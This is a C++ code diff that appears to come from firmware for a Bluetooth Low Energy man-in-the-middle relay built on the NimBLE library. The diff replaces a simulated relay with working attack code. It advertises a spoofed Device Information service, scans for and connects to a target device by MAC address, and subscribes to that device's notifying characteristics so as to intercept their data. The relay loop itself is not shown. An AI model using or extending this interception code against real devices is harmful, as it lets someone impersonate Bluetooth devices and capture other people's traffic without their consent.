@@ -96,19 +96,60 @@ RelayResult MitmRelay::startRelay(const RelayConfig& config) {
   // Create generic service for relaying (0x180A is Device Information Service as template)
   NimBLEService* pService = g_relayServer->createService("180A");
 
-  // Create characteristic for relaying data
-  g_relayChar = pService->createCharacteristic("2A29", NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY);
+  // Create characteristic for data relay
+  g_relayChar = pService->createCharacteristic(
+    "2A29",  // Manufacturer characteristic
+    NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY);
   g_relayChar->setCallbacks(new RelayCharacteristicCallbacks());
+
   pService->start();
 
-  uint32_t relayCount = 0;
+  // Setup advertising for relay server
+  NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
+  pAdvertising->addServiceUUID(pService->getUUID());
+  pAdvertising->setScanResponse(true);
+  pAdvertising->setMinInterval(0x06);
+  pAdvertising->setMaxInterval(0x12);
+  pAdvertising->start();
 
-  // Connect to target device
+  // Step 2: Setup BLE Client (to connect to real target device)
+  g_relayClient = NimBLEDevice::createClient();
+  g_relayClient->setCallbacks(new RelayClientCallbacks());
+  g_relayClient->setConnectTimeout(10 * 1000);  // 10 second timeout
+
+  // Scan for target device
   NimBLEScan* pScan = NimBLEDevice::getScan();
   pScan->setActiveScan(true);
-  pScan->start(5, false);
+  pScan->setInterval(100);
+  pScan->setWindow(99);
+  pScan->setMaxResults(0);
 
-  // Simulate packet relay in the relay loop below
+  Serial.printf("[BLE MITM] Scanning for target device: %02X:%02X:%02X:%02X:%02X:%02X\n",
+               config.targetAddr[0], config.targetAddr[1], config.targetAddr[2],
+               config.targetAddr[3], config.targetAddr[4], config.targetAddr[5]);
+
+  // Connect to target device
+  NimBLEAddress targetAddr(config.targetAddr, BLE_ADDR_RANDOM);
+  if (g_relayClient->connect(targetAddr)) {
+    Serial.println("[BLE MITM] Connected to target device");
+
+    // Discover services and characteristics
+    if (g_relayClient->discoverAttributes()) {
+      // Subscribe to all readable characteristics for interception
+      std::vector<NimBLERemoteCharacteristic*> characteristics =
+        g_relayClient->getService("180A")->getCharacteristics();
+
+      for (auto pChar : characteristics) {
+        if (pChar->canNotify()) {
+          pChar->subscribe(true);
+        }
+      }
+    }
+  } else {
+    result.error = "Failed to connect to target device";
+    isRunning_ = false;
+    return result;
+  }
 
   // Step 3: Run relay loop
   uint32_t relayStartTime = millis();
@@ -233,6 +274,7 @@ void MitmRelay::stop() {
   }
   if (g_relayServer) {
     NimBLEDevice::getAdvertising()->stop();
+    g_relayServer->deinit();
   }
   NimBLEDevice::deinit();
   g_relayServer = nullptr;
